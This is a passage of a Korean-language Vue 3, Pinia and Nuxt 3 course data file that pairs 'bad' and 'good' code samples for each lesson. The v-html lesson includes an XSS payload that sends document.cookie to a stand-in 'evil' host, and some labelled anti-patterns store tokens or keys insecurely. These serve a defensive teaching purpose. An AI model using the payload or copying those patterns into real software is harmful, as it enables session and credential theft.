          note: `컴포넌트 안에서만 쓸 것이면 onUnmounted 도 됩니다. onScopeDispose 는 컴포넌트 밖 effectScope 에서도 동작하므로 컴포저블에 더 맞습니다.`,
        },
        {
          id: 'l6', short: `비동기 상태`,
          title: `비동기 컴포저블은 data, error, pending 을 함께 돌려준다`,
          why: `데이터만 돌려주면 쓰는 쪽은 로딩 중인지 실패했는지 알 수 없어 빈 화면이 됩니다. 상태 세 가지와 다시 부르는 함수까지 한 세트로 돌려줍니다.`,
          bad: String.raw`
export function useUsers() {
  const users = ref([])
  fetch('/api/users').then(r => r.json()).then(d => users.value = d)
  return users               // 로딩 중인지, 실패했는지 알 길이 없다
}
`,
          good: String.raw`
export function useUsers() {
  const data = ref<User[]>([])
  const error = ref<Error | null>(null)
  const pending = ref(true)

  async function load() {
    pending.value = true
    error.value = null
    try { data.value = await $fetch<User[]>('/api/users') }
    catch (e) { error.value = e as Error }
    finally { pending.value = false }
  }
  load()
  return { data, error, pending, refresh: load }
}
`,
          note: `Nuxt 에서는 useFetch / useAsyncData 가 이 모양을 이미 갖추고 있습니다 (7회차).`,
        },
        {
          id: 'l7', short: `공유 여부`,
          title: `상태를 호출마다 만들지 공유할지는 이름으로 드러낸다`,
          why: `모듈 최상위에 ref 를 두면 모든 호출이 같은 값을 공유합니다. 실수로 공유되면 카운터 둘이 같이 움직이고, SSR 에서는 요청끼리 데이터가 섞입니다.`,
          bad: String.raw`
// 모듈 최상위 ref: 모든 호출이 하나의 값을 공유한다
const count = ref(0)
export function useCounter() {
  return { count }           // 카운터 둘을 쓰면 같이 움직인다. 의도였나?
}
`,
          good: String.raw`
// 호출마다 새 상태 (기본)
export function useCounter() {
  const count = ref(0)
  return { count }
}

// 일부러 공유할 때는 이름으로 드러낸다
const _theme = ref<'light' | 'dark'>('light')
export function useGlobalTheme() {
  return { theme: _theme }
}
`,
          note: `SSR 에서는 모듈 전역 ref 가 요청 사이에 공유되어 사용자 데이터가 섞입니다. Nuxt 에서는 useState 를 씁니다 (8회차 08번).`,
        },
        {
          id: 'l8', short: `VueUse`,
          title: `직접 짜기 전에 VueUse 를 찾는다`,
          why: `디바운스, 로컬스토리지 동기화, 미디어 쿼리, 교차 관찰 같은 것은 VueUse 에 SSR 처리와 정리까지 끝난 구현이 있습니다. 직접 짜면 빠뜨리는 것이 꼭 생깁니다.`,
          bad: String.raw`
let timer
watch(query, (q) => {
  clearTimeout(timer)
  timer = setTimeout(() => search(q), 300)
})
const dark = ref(localStorage.getItem('dark') === 'true')   // SSR 에서 터진다
watch(dark, v => localStorage.setItem('dark', String(v)))
`,
          good: String.raw`
import { useDebounceFn, useLocalStorage, useMediaQuery } from '@vueuse/core'

const search = useDebounceFn((q) => api.search(q), 300)
watch(query, search)

const dark = useLocalStorage('dark', false)      // 읽기, 쓰기, 직렬화, SSR 처리
const isMobile = useMediaQuery('(max-width: 760px)')
`,
        },
        {
          id: 'l9', short: `내부 API 금지`,
          title: `getCurrentInstance 대신 provide/inject`,
          why: `getCurrentInstance 는 내부 API 라 버전마다 바뀔 수 있고 타입도 없습니다. 전역 서비스는 앱에서 provide 하고 컴포저블이 inject 하는 것이 공식 경로입니다.`,
          bad: String.raw`
export function useToast() {
  const vm = getCurrentInstance()
  return vm.appContext.config.globalProperties.$toast   // 내부 API 에 기댄다
}
`,
          good: String.raw`
// app.ts
export const toastKey: InjectionKey<Toast> = Symbol('toast')
app.provide(toastKey, createToast())

// composables/useToast.ts
export function useToast() {
  const toast = inject(toastKey)
  if (!toast) throw new Error('useToast: toast 가 provide 되지 않았습니다')
  return toast
}
`,
        },
        {
          id: 'l10', short: `테스트`,
          title: `라이프사이클을 쓰는 컴포저블은 withSetup 으로 테스트`,
          why: `onMounted 같은 훅을 쓰는 컴포저블을 그냥 부르면 인스턴스가 없어 경고만 나고 동작하지 않습니다. 작은 앱에 마운트해서 부르는 헬퍼 하나면 됩니다.`,
          bad: String.raw`
// useCounter.spec.ts
import { useCounter } from './useCounter'

const { count, inc } = useCounter()   // onMounted 를 쓰는 컴포저블이면 경고, 동작 안 함
inc()
expect(count.value).toBe(1)
`,
          good: String.raw`
// test/withSetup.ts
import { createApp } from 'vue'
export function withSetup<T>(composable: () => T) {
  let result!: T
  const app = createApp({ setup() { result = composable(); return () => {} } })
  app.mount(document.createElement('div'))
  return [result, app] as const
}

// useCounter.spec.ts
const [counter, app] = withSetup(() => useCounter())
counter.inc()
expect(counter.count.value).toBe(1)
app.unmount()                          // onUnmounted 정리까지 검증
`,
        },
      ],
    },
    {
      id: 'vue-5', no: 5, name: `템플릿과 스타일`,
      lead: `템플릿 디렉티브와 스타일을 안전하고 깔끔하게 쓰는 습관입니다.`,
      lessons: [
        {
          id: 'l1', short: `v-html XSS`,
          title: `사용자 입력에 v-html 금지`,
          why: `v-html 은 문자열을 그대로 DOM 에 넣습니다. 사용자가 쓴 내용이면 스크립트가 섞여 들어와 세션을 훔쳐 갑니다. 텍스트 보간은 자동으로 이스케이프됩니다.`,
          bad: String.raw`
<!-- 사용자가 쓴 댓글을 그대로 HTML 로 -->
<div v-html="comment.body"></div>
<!-- <img src=x onerror="fetch('https://evil/?c=' + document.cookie)"> -->
`,
          good: String.raw`
<!-- 텍스트 보간은 자동으로 이스케이프된다 -->
<div>{{ comment.body }}</div>

<!-- 꼭 HTML 이어야 하면 서버나 DOMPurify 로 거른 뒤 -->
<div v-html="sanitized"></div>
<script setup>
import DOMPurify from 'dompurify'
const sanitized = computed(() => DOMPurify.sanitize(comment.body))
</script>
`,
        },
        {
          id: 'l2', short: `v-show vs v-if`,
          title: `자주 토글하면 v-show, 드물거나 없어야 하면 v-if`,
          why: `v-if 는 DOM 을 만들고 부수고, v-show 는 display 만 바꿉니다. 무거운 컴포넌트를 자주 껐다 켜면 v-show, 권한처럼 아예 DOM 에 없어야 하면 v-if 입니다.`,
          bad: String.raw`
<!-- 탭을 바꿀 때마다 무거운 차트를 만들고 부순다 -->
<HeavyChart v-if="tab === 'chart'" />

<!-- 로그인 안 한 사용자에게도 관리자 패널을 DOM 에 넣어 둔다 -->
<AdminPanel v-show="isAdmin" />
`,
          good: String.raw`
<!-- 자주 토글하고 만들기가 비싸면 v-show (display 만 바꾼다) -->
<HeavyChart v-show="tab === 'chart'" />

<!-- 조건이 잘 안 바뀌거나 아예 없어야 하면 v-if (DOM 에 없다) -->
<AdminPanel v-if="isAdmin" />
`,
        },
        {
          id: 'l3', short: `class 바인딩`,
          title: `class 와 style 은 문자열 연결 대신 객체/배열`,
          why: `문자열을 이어 붙이면 공백 하나에 클래스가 붙어 버리고 읽기도 어렵습니다. 객체 문법은 조건과 클래스 이름이 나란히 보입니다.`,
          bad: String.raw`
<div :class="'btn ' + (active ? 'btn-active ' : '') + (size === 'lg' ? 'btn-lg' : '')">
<div :style="'color:' + color + ';width:' + width + 'px'">
`,
          good: String.raw`
<div class="btn" :class="{ 'btn-active': active, 'btn-lg': size === 'lg' }">
<div :class="[sizeClass, { active }]">
<div :style="{ color, width: width + 'px' }">
`,
        },
        {
          id: 'l4', short: `scoped`,
          title: `스타일은 scoped, 자식 안쪽은 :deep()`,
          why: `전역 스타일은 다른 컴포넌트의 같은 클래스까지 바꿉니다. scoped 는 이 컴포넌트의 요소에만 붙고, 자식 컴포넌트 안쪽을 일부러 건드릴 때만 :deep() 으로 드러냅니다.`,
          bad: String.raw`
<style>
/* 전역: 다른 컴포넌트의 .title 도 바뀐다 */
.title { color: red; }
</style>

<style scoped>
/* 자식 컴포넌트 안쪽에는 안 먹는다 */
.child .title { color: red; }
</style>
`,
          good: String.raw`
<style scoped>
.title { color: red; }                 /* 이 컴포넌트의 요소만 */
.child :deep(.title) { color: red; }   /* 자식 안쪽을 일부러 건드릴 때 */
</style>

<!-- 디자인 토큰, 리셋 같은 진짜 전역은 한 파일(assets/main.css)에만 -->
`,
        },
        {
          id: 'l5', short: `CSS v-bind`,
          title: `반응형 값은 inline style 대신 CSS 의 v-bind()`,
          why: `스타일 규칙이 템플릿의 :style 과 style 블록에 흩어지면 어디서 정해지는지 찾기 어렵습니다. v-bind() 는 반응형 값을 CSS 변수로 넣어 규칙을 style 블록에 모읍니다.`,
          bad: String.raw`
<div class="bar" :style="{ width: percent + '%', background: color }"></div>
<!-- 스타일 규칙이 템플릿과 style 블록에 흩어진다 -->
`,
          good: String.raw`
<div class="bar"></div>

<style scoped>
.bar {
  width: v-bind('percent + "%"');     /* 반응형 값이 CSS 변수로 들어간다 */
  background: v-bind(color);
  transition: width .2s;
}
</style>
`,
        },
        {
          id: 'l6', short: `Teleport`,
          title: `모달, 툴팁은 Teleport 로 body 에`,
          why: `깊은 컴포넌트 안에서 그린 모달은 부모의 overflow:hidden, z-index, transform 에 갇힙니다. Teleport 는 DOM 만 밖으로 보내고 상태와 이벤트는 이 컴포넌트에 남깁니다.`,
          bad: String.raw`
<!-- 부모의 overflow:hidden, z-index, transform 에 갇힌다 -->
<div class="card">
  <div v-if="open" class="modal">...</div>
</div>
`,
          good: String.raw`
<div class="card">
  <Teleport to="body">
    <div v-if="open" class="modal">...</div>
  </Teleport>
</div>
<!-- DOM 은 body 끝에, 상태와 이벤트는 이 컴포넌트에 -->
`,
          note: `SSR 에서는 대상 요소가 서버에 없을 수 있습니다. Nuxt 라면 <code>&lt;ClientOnly&gt;</code> 로 감싸거나 Vue 3.5 의 <code>defer</code> 옵션을 봅니다.`,
        },
        {
          id: 'l7', short: `Transition`,
          title: `나타나고 사라지는 애니메이션은 Transition`,
          why: `v-if 로 사라지는 순간 DOM 이 없어져 CSS 만으로는 끝 애니메이션이 보이지 않습니다. Transition 이 DOM 을 붙잡고 클래스를 바꿔 줍니다. 목록은 TransitionGroup 과 key 입니다.`,
          bad: String.raw`
<!-- 사라지는 순간 DOM 이 없어져 끝 애니메이션이 안 보인다 -->
<div v-if="show" class="fade">...</div>
<style>.fade { transition: opacity .3s }</style>
`,
          good: String.raw`
<Transition name="fade">
  <div v-if="show">...</div>
</Transition>

<TransitionGroup name="list" tag="ul">
  <li v-for="item in items" :key="item.id">{{ item.text }}</li>   <!-- key 필수 -->
</TransitionGroup>

<style>
.fade-enter-active, .fade-leave-active { transition: opacity .3s }
.fade-enter-from, .fade-leave-to { opacity: 0 }
.list-move { transition: transform .3s }
</style>
`,
        },
        {
          id: 'l8', short: `template 그룹`,
          title: `요소를 묶어 조건을 걸 때는 div 대신 template`,
          why: `조건 하나 걸자고 div 를 두르면 레이아웃(flex, grid)이 깨집니다. template 은 렌더링 결과에 남지 않습니다.`,
          bad: String.raw`
<div v-if="user">          <!-- 레이아웃을 깨는 불필요한 div -->
  <h1>{{ user.name }}</h1>
  <p>{{ user.bio }}</p>
</div>
`,
          good: String.raw`
<template v-if="user">     <!-- 렌더링 결과에 남지 않는다 -->
  <h1>{{ user.name }}</h1>
  <p>{{ user.bio }}</p>
</template>
`,
        },
        {
          id: 'l9', short: `KeepAlive`,
          title: `탭 전환은 동적 컴포넌트 + KeepAlive`,
          why: `v-if 체인으로 탭을 바꾸면 비활성 탭이 파괴되어 입력 중이던 폼이 날아갑니다. component :is 로 바꾸고 KeepAlive 로 감싸면 상태가 남습니다.`,
          bad: String.raw`
<ProfileTab v-if="tab === 'profile'" />
<OrdersTab v-else-if="tab === 'orders'" />
<SettingsTab v-else />
<!-- 탭을 옮길 때마다 입력 중이던 폼이 날아간다 -->
`,
          good: String.raw`
<script setup>
const tabs = { profile: ProfileTab, orders: OrdersTab, settings: SettingsTab }
</script>

<KeepAlive>
  <component :is="tabs[tab]" />   <!-- 비활성 탭의 상태가 유지된다 -->
</KeepAlive>
`,
          note: `<code>include</code>, <code>max</code> 로 캐시 대상을 제한합니다. 캐시된 컴포넌트는 onActivated / onDeactivated 훅을 받습니다.`,
        },
        {
          id: 'l10', short: `접근성`,
          title: `클릭되는 것은 button, 입력에는 label`,
          why: `div 에 @click 을 걸면 키보드와 스크린 리더로는 누를 수 없습니다. 의미에 맞는 요소를 쓰면 포커스, 엔터 키, 역할 안내가 공짜로 따라옵니다.`,
          bad: String.raw`
<div class="btn" @click="save">저장</div>          <!-- 키보드로 못 누른다 -->
<img src="/chart.png">                              <!-- 대체 텍스트 없음 -->
<input v-model="email" placeholder="이메일">        <!-- 레이블 없음 -->
`,
          good: String.raw`
<button type="button" @click="save">저장</button>
<img src="/chart.png" alt="월별 매출 추이">
<label for="email">이메일</label>
<input id="email" v-model="email" type="email" autocomplete="email">
`,
        },
      ],
    },
    {
      id: 'vue-6', no: 6, name: `Pinia 상태 관리`,
      lead: `Vue 3 공식 상태 관리 Pinia 를 쓰는 습관입니다. Setup 스토어 문법을 기준으로 합니다.`,
      lessons: [
        {
          id: 'l1', short: `Setup 스토어`,
          title: `스토어는 컴포저블과 같은 모양으로`,
          badLabel: `✕ Vuex 습관`, goodLabel: `✓ Setup 스토어`,
          why: `Pinia 에는 mutation 이 없고 this 에 기댈 필요도 없습니다. Setup 스토어는 ref, computed, 함수를 돌려주는 컴포저블과 같은 모양이라 watch, inject 도 그대로 씁니다.`,
          bad: String.raw`
// Vuex 를 그대로 옮긴 모양: mutation 을 흉내내고 this 에 기댄다
export const useCart = defineStore('cart', {
  state: () => ({ items: [] }),
  mutations: { ... },              // Pinia 에는 mutation 이 없다
  actions: {
    add(item) { this.commit('ADD', item) }
  }
})
`,
          good: String.raw`
export const useCartStore = defineStore('cart', () => {
  const items = ref<Item[]>([])                                              // state
  const total = computed(() => items.value.reduce((a, i) => a + i.price, 0))  // getter
  function add(item: Item) { items.value.push(item) }                        // action
  return { items, total, add }
})
`,
          note: `Options 스토어(state / getters / actions 객체)도 정식 문법입니다. 다만 컴포저블과 같은 모양인 Setup 스토어가 재사용과 타입 추론에 유리합니다.`,
        },
        {
          id: 'l2', short: `storeToRefs`,
          title: `스토어를 구조 분해하려면 storeToRefs`,
          why: `스토어는 reactive 객체라 구조 분해하면 반응성이 끊깁니다. state 와 getter 는 storeToRefs 로 꺼내고, action 은 그냥 꺼내도 됩니다.`,
          bad: String.raw`
const { items, total } = useCartStore()   // 반응성 끊김: 값만 복사
`,
          good: String.raw`
const cart = useCartStore()
const { items, total } = storeToRefs(cart)   // state, getter 는 ref 로
const { add } = cart                          // action 은 그냥 꺼내도 된다
`,
        },
        {
          id: 'l3', short: `$patch`,
          title: `여러 값을 바꿀 때는 $patch 또는 action`,
          why: `state 를 밖에서 하나씩 바꾸면 변경마다 구독자가 깨어나고, 무엇을 하려던 변경인지 devtools 에 남지 않습니다. 묶어서 바꾸거나 이름 붙은 action 으로 의도를 드러냅니다.`,
          bad: String.raw`
cart.items = []                  // 여기저기서 state 를 직접 바꾼다
cart.coupon = null
cart.updatedAt = Date.now()      // 세 번의 변경, 세 번의 구독 알림
`,
          good: String.raw`
// 여러 값을 한 번에
cart.$patch({ items: [], coupon: null, updatedAt: Date.now() })
cart.$patch((s) => { s.items.push(item); s.updatedAt = Date.now() })

// 이름 붙은 작업은 action 으로. devtools 에 이름이 남고 호출을 추적할 수 있다
function clear() { items.value = []; coupon.value = null }
`,
        },
        {
          id: 'l4', short: `인자 있는 getter`,
          title: `인자를 받는 getter 는 캐시되지 않는다`,
          why: `함수를 돌려주는 computed 는 호출마다 다시 계산합니다. 캐시가 필요 없으면 그냥 함수로 두고, 필요하면 Map 을 computed 로 만들어 거기서 꺼냅니다.`,
          bad: String.raw`
const byId = computed(() => (id) => items.value.find(i => i.id === id))
// cart.byId(3) 처럼 쓰이지만 호출마다 find 가 돈다. computed 로 감쌀 이유가 없다
`,
          good: String.raw`
// 캐시가 필요 없으면 그냥 함수로
function byId(id: number) { return items.value.find(i => i.id === id) }

// 캐시가 필요하면 Map 을 computed 로 만들고 거기서 꺼낸다
const index = computed(() => new Map(items.value.map(i => [i.id, i])))
function byId2(id: number) { return index.value.get(id) }
`,
        },
        {
          id: 'l5', short: `스토어끼리`,
          title: `다른 스토어는 쓰는 시점에 부른다`,
          why: `스토어 최상위에서 다른 스토어를 부르면 서로 참조할 때 undefined 가 되고, 값을 복사해 두면 반응성이 끊깁니다. action 이나 computed 안에서 부릅니다.`,
          bad: String.raw`
export const useCartStore = defineStore('cart', () => {
  const auth = useAuthStore()               // 최상위 호출: 순환 참조면 undefined
  const userId = auth.user.id               // 한 번 복사되고 끝
  ...
})
`,
          good: String.raw`
export const useCartStore = defineStore('cart', () => {
  async function checkout() {
    const auth = useAuthStore()             // 쓰는 시점에 부른다
    await $fetch('/api/orders', { method: 'POST', body: { userId: auth.user?.id, items: items.value } })
  }
  // 반응형으로 따라가야 하면 computed 안에서
  const canCheckout = computed(() => !!useAuthStore().user && items.value.length > 0)
  return { checkout, canCheckout }
})
`,
        },
        {
          id: 'l6', short: `컴포넌트 밖`,
          title: `컴포넌트 밖에서는 pinia 가 설치된 뒤에 부른다`,
          why: `라우터 파일 최상위처럼 앱이 만들어지기 전에 useStore 를 부르면 활성 pinia 가 없어 오류가 납니다. 가드 함수 안처럼 실행 시점으로 미루거나 인스턴스를 직접 넘깁니다.`,
          bad: String.raw`
// router.ts 최상위
const auth = useAuthStore()      // pinia 가 아직 app 에 설치되기 전: 오류
router.beforeEach((to) => {
  if (to.meta.auth && !auth.user) return '/login'
})
`,
          good: String.raw`
router.beforeEach((to) => {
  const auth = useAuthStore()    // 가드가 실행될 때는 pinia 가 설치되어 있다
  if (to.meta.auth && !auth.user) return '/login'
})

// 설치 순서가 애매한 곳에서는 인스턴스를 직접 넘긴다
const pinia = createPinia()
app.use(pinia)
useAuthStore(pinia)
`,
          note: `Nuxt(@pinia/nuxt) 에서는 플러그인과 미들웨어에서 그냥 useAuthStore() 를 부르면 됩니다. 현재 요청의 pinia 가 자동으로 붙습니다.`,
        },
        {
          id: 'l7', short: `초기화`,
          title: `초기 상태를 함수로 두고 $reset 을 만든다`,
          why: `로그아웃처럼 상태를 처음으로 되돌릴 때 필드를 하나씩 비우면 새 필드가 생길 때마다 빠뜨립니다. 초기 상태를 한 함수에 두면 초기화도 테스트도 그 함수로 끝납니다.`,
          bad: String.raw`
function logout() {
  user.value = null
  token.value = ''
  roles.value = []         // 새 필드가 생길 때마다 여기도 고쳐야 한다
}
`,
          good: String.raw`
// Setup 스토어는 $reset 이 기본 제공되지 않으니 직접 만든다
const initial = () => ({ user: null as User | null, token: '', roles: [] as string[] })
const state = reactive(initial())

function $reset() { Object.assign(state, initial()) }
return { ...toRefs(state), $reset }

// Options 스토어라면 cart.$reset() 이 바로 된다
`,
        },
        {
          id: 'l8', short: `저장`,
          title: `브라우저 저장은 플러그인으로, 비밀은 저장하지 않는다`,
          why: `localStorage 를 직접 읽으면 SSR 에서 터지고, 토큰을 평문으로 두면 XSS 한 번에 넘어갑니다. UI 설정만 플러그인으로 저장하고 인증은 httpOnly 쿠키에 맡깁니다.`,
          bad: String.raw`
const token = ref(localStorage.getItem('token'))     // SSR 에서 localStorage 없음
watch(token, v => localStorage.setItem('token', v))  // 토큰을 평문 저장
`,
          good: String.raw`
// pinia-plugin-persistedstate
export const useSettingsStore = defineStore('settings', () => {
  const theme = ref('light')
  const pageSize = ref(20)
  return { theme, pageSize }
}, { persist: { pick: ['theme', 'pageSize'] } })   // UI 설정만. 토큰은 httpOnly 쿠키로
`,
          note: `persistedstate 3 에서는 <code>pick</code> 대신 <code>paths</code> 였습니다. Nuxt 에서는 <code>@pinia-plugin-persistedstate/nuxt</code> 가 쿠키 저장소까지 처리합니다.`,
        },
        {
          id: 'l9', short: `서버 상태`,
          title: `API 응답 캐시는 스토어가 아니라 데이터 도구에`,
          why: `서버 데이터를 스토어에 쌓으면 갱신, 중복 요청, 만료, 로딩 상태를 전부 손으로 짜야 합니다. useFetch 나 TanStack Query 가 그 일을 하고, 스토어에는 클라이언트가 주인인 상태만 둡니다.`,
          bad: String.raw`
export const useUsersStore = defineStore('users', () => {
  const users = ref([])
  const loaded = ref(false)
  async function load() {
    if (!loaded.value) { users.value = await $fetch('/api/users'); loaded.value = true }
  }
  return { users, load }        // 갱신, 중복 요청, 만료를 손으로
})
`,
          good: String.raw`
// 서버 데이터는 가져오는 쪽 도구에 맡긴다
const { data: users, refresh } = await useFetch('/api/users')            // Nuxt
const { data } = useQuery({ queryKey: ['users'], queryFn: fetchUsers })  // TanStack Query

// 스토어에는 클라이언트가 주인인 상태만: 로그인 사용자, 장바구니, UI 설정
`,
        },
        {
          id: 'l10', short: `전역 reactive`,
          title: `전역 reactive 객체 대신 Pinia`,
          why: `모듈에 reactive 하나 두고 import 해 쓰면 당장은 되지만 devtools 에 안 보이고, SSR 에서 요청끼리 섞이고, 테스트에서 갈아끼울 수 없습니다.`,
          bad: String.raw`
// store.ts
export const store = reactive({ user: null, cart: [] })
// 어디서든 import 해서 바꾼다. devtools 에 안 보이고 SSR 에서 요청끼리 섞인다
`,
          good: String.raw`
export const useAppStore = defineStore('app', () => { ... })
// devtools 변경 추적, 플러그인(persist), SSR 하이드레이션, 테스트의 createTestingPinia

// 한 컴포넌트 트리 안의 작은 공유는 provide / inject 로 충분 (2회차 05번)
`,
        },
      ],
    },
    {
      id: 'vue-7', no: 7, name: `Nuxt 3 기본`,
      lead: `Nuxt 3 의 약속(convention)을 따르면 설정이 줄고 코드가 예측 가능해집니다. 디렉터리 규칙과 데이터 가져오기 API 부터 익힙니다.`,
      lessons: [
        {
          id: 'l1', short: `파일 라우팅`,
          title: `라우터 설정 대신 pages/ 디렉터리`, ver: `Nuxt 3.x`,
          why: `pages/ 의 파일 이름이 곧 라우트입니다. 라우트 테이블을 손으로 관리하지 않아도 되고, 코드 분할과 타입 있는 라우트 이름이 따라옵니다.`,
          bad: String.raw`
// router.ts 를 직접 만들고 vue-router 를 설치한다
import { createRouter, createWebHistory } from 'vue-router'
const router = createRouter({
  history: createWebHistory(),
  routes: [{ path: '/users/:id', component: () => import('./UserPage.vue') }]
})
`,
          good: String.raw`
pages/
  index.vue            → /
  about.vue            → /about
  users/index.vue      → /users
  users/[id].vue       → /users/:id
  [...slug].vue        → 나머지 전부 (404 대체 등)

<!-- app.vue -->
<template>
  <NuxtLayout>
    <NuxtPage />
  </NuxtLayout>
</template>
`,
          note: `Nuxt 4 부터는 <code>app/pages/</code> 처럼 <code>app/</code> 아래로 들어갑니다. 규칙 자체는 같습니다.`,
        },
        {
          id: 'l2', short: `자동 import`,
          title: `vue, 컴포저블, 컴포넌트는 import 하지 않는다`,
          why: `Nuxt 는 vue 와 vue-router 의 API, composables/, utils/, components/ 를 자동으로 import 합니다. 손으로 쓴 import 는 틀리면 번들이 둘이 되고, 맞아도 잡음입니다.`,
          bad: String.raw`
<script setup>
import { ref, computed, watch } from 'vue'
import { useRoute } from 'vue-router'
import TodoItem from '~/components/TodoItem.vue'
import { useCart } from '~/composables/useCart'
</script>
`,
          good: String.raw`
<script setup>
// vue, vue-router, Nuxt 컴포저블, components/, composables/, utils/ 는 자동 import
const route = useRoute()
const cart = useCart()
const count = ref(0)
</script>
<template>
  <TodoItem />                  <!-- components/TodoItem.vue -->
  <FormInputText />             <!-- components/form/InputText.vue: 경로가 이름이 된다 -->
</template>
`,
          note: `어디서 왔는지 헷갈리면 <code>.nuxt/imports.d.ts</code> 와 <code>.nuxt/components.d.ts</code> 를 봅니다. 타입만 가져올 때는 <code>import type</code> 을 직접 씁니다.`,
        },
        {
          id: 'l3', short: `NuxtLink`,
          title: `내부 이동은 a 태그 대신 NuxtLink`,
          why: `a 태그는 전체 페이지를 새로 불러와 상태가 날아갑니다. NuxtLink 는 클라이언트 라우팅을 하고, 화면에 보이면 대상 페이지를 미리 가져옵니다.`,
          bad: String.raw`
<a href="/about">소개</a>        <!-- 전체 페이지를 새로 불러온다 -->
<a href="https://nuxt.com">Nuxt</a>
`,
          good: String.raw`
<NuxtLink to="/about">소개</NuxtLink>           <!-- 클라이언트 라우팅 + 보이면 미리 가져오기 -->
<NuxtLink to="https://nuxt.com" external target="_blank">Nuxt</NuxtLink>
<NuxtLink :to="{ name: 'users-id', params: { id: 3 } }">사용자</NuxtLink>
`,
        },
        {
          id: 'l4', short: `useFetch vs $fetch`,
          title: `setup 에서는 useFetch, 사용자 동작에는 $fetch`,
          why: `setup 에서 $fetch 를 쓰면 서버에서 한 번, 클라이언트 하이드레이션 때 또 한 번 불립니다. useFetch 는 서버 결과를 페이로드에 실어 넘겨 두 번 부르지 않습니다. 버튼을 눌러 보내는 요청은 $fetch 가 맞습니다.`,
          bad: String.raw`
<script setup>
const users = ref([])
users.value = await $fetch('/api/users')   // 서버에서 1번, 브라우저에서 또 1번

async function save() {
  const { data } = await useFetch('/api/users', { method: 'POST', body: form })   // 이벤트 안의 useFetch
}
</script>
`,
          good: String.raw`
<script setup>
const { data: users, status, error } = await useFetch('/api/users')   // 한 번만, 결과는 페이로드로

async function save() {
  await $fetch('/api/users', { method: 'POST', body: form })   // 사용자 동작은 $fetch
  await refreshNuxtData()
}
</script>
`,
        },
        {
          id: 'l5', short: `useAsyncData key`,
          title: `useAsyncData 에는 데이터를 설명하는 키를 준다`,
          why: `키를 생략하면 파일 위치로 자동 생성됩니다. 같은 데이터를 다른 컴포넌트에서 받으면 캐시가 공유되지 않고, 골라서 새로고침할 수도 없습니다. 키는 데이터와 그 매개변수를 담아야 합니다.`,
          bad: String.raw`
const { data } = await useAsyncData(() => $fetch('/api/users/' + id.value))
// 키가 파일 위치로 자동 생성된다. 다른 곳에서 같은 사용자를 받아도 캐시가 안 맞는다
// id 가 바뀌어도 다시 가져오지 않는다
`,
          good: String.raw`
const { data: user } = await useAsyncData(
  \`user-\${id.value}\`,                   // 데이터를 설명하는 유일한 키
  () => $fetch('/api/users/' + id.value),
  { watch: [id] }                        // id 가 바뀌면 다시
)
// 같은 키를 쓰는 곳끼리 결과를 공유하고, refreshNuxtData('user-3') 로 골라 새로고침한다
`,
          note: `Nuxt 3.17 부터 키 자리에 computed 나 getter 를 줄 수 있어 id 가 바뀌면 키도 따라 바뀝니다. useFetch 는 URL 과 옵션으로 키를 만들어 줍니다.`,
        },
        {
          id: 'l6', short: `runtimeConfig`,
          title: `환경 값은 process.env 대신 runtimeConfig`,
          why: `process.env 는 빌드 시점에 박히거나 클라이언트에서 undefined 입니다. runtimeConfig 는 실행 시점에 NUXT_ 환경 변수로 덮이고, public 아래만 클라이언트에 노출됩니다.`,
          bad: String.raw`
const API = process.env.API_BASE            // 빌드 시점에 박히거나 undefined
const SECRET = import.meta.env.VITE_SECRET  // VITE_ 접두사는 클라이언트 번들에 들어간다
`,
          good: String.raw`
// nuxt.config.ts
export default defineNuxtConfig({
  runtimeConfig: {
    apiSecret: '',                        // 서버에서만. NUXT_API_SECRET 환경 변수로 덮인다
    public: { apiBase: '/api' }           // 클라이언트에도 노출. NUXT_PUBLIC_API_BASE
  }
})

// 어디서든
const config = useRuntimeConfig()
config.public.apiBase
config.apiSecret                           // 서버 라우트에서만 값이 있다
`,
        },
        {
          id: 'l7', short: `layouts`,
          title: `공통 틀은 layouts/ 에`,
          why: `헤더와 푸터를 페이지마다 복사하면 한 번 고칠 때 모든 페이지를 고칩니다. 레이아웃은 slot 자리에 페이지를 끼우고, 페이지는 definePageMeta 로 어느 틀을 쓸지만 말합니다.`,
          bad: String.raw`
<!-- 모든 페이지에 헤더/푸터를 복사한다 -->
<template>
  <AppHeader />
  <main>...</main>
  <AppFooter />
</template>
`,
          good: String.raw`
<!-- layouts/default.vue -->
<template>
  <AppHeader />
  <main><slot /></main>
  <AppFooter />
</template>

<!-- pages/admin/index.vue -->
<script setup>
definePageMeta({ layout: 'admin' })     // layouts/admin.vue
</script>
`,
        },
        {
          id: 'l8', short: `server/api`,
          title: `외부 API 와 비밀 키는 server/api 뒤에 숨긴다`,
          why: `브라우저에서 외부 API 를 바로 부르면 키가 노출되고 CORS 에 막힙니다. server/api 핸들러가 대신 부르면 키는 서버에만 있고, 응답 타입이 클라이언트까지 추론됩니다.`,
          bad: String.raw`
// 프론트에서 바로 외부 API 를 부른다: 키가 노출되고 CORS 에 막힌다
const data = await $fetch('https://api.weather.com/v1?key=SECRET&city=' + city)
`,
          good: String.raw`
// server/api/weather.get.ts
export default defineEventHandler(async (event) => {
  const { city } = getQuery(event)
  const config = useRuntimeConfig(event)
  return $fetch('https://api.weather.com/v1', { query: { key: config.weatherKey, city } })
})

// 페이지
const { data } = await useFetch('/api/weather', { query: { city } })   // 응답 타입이 핸들러에서 추론된다
`,
          note: `파일 이름의 <code>.get</code>, <code>.post</code> 접미사로 메서드를 가릅니다. 접미사가 없으면 모든 메서드를 받습니다.`,
        },
        {
          id: 'l9', short: `nuxt.config`,
          title: `nuxt.config 에는 모듈과 앱 전역 설정만`,
          why: `설정 파일은 빌드와 모든 요청이 읽습니다. 비밀, 로직, 라우트 테이블을 넣으면 번들에 들어가거나 다른 자리의 기능(runtimeConfig, server/, pages/)과 겹칩니다.`,
          bad: String.raw`
// 아무거나 다 넣는다: 서버 비밀, 플러그인 로직, 라우트 테이블
export default defineNuxtConfig({
  apiKey: 'sk-...',
  router: { routes: [ ... ] },
  hooks: { 'app:created': () => { /* 수십 줄 */ } }
})
`,
          good: String.raw`
// nuxt.config.ts: 모듈과 앱 전역 설정만
export default defineNuxtConfig({
  modules: ['@pinia/nuxt', '@nuxt/image', '@vueuse/nuxt'],
  app: {
    head: {
      titleTemplate: '%s · 파인코드',
      htmlAttrs: { lang: 'ko' },
      link: [{ rel: 'icon', href: '/favicon.ico' }]
    }
  },
  css: ['~/assets/main.css'],
  compatibilityDate: '2025-07-15'
})
`,
        },
        {
          id: 'l10', short: `app.config`,
          title: `공개 설정은 app.config, 환경 값은 runtimeConfig`,
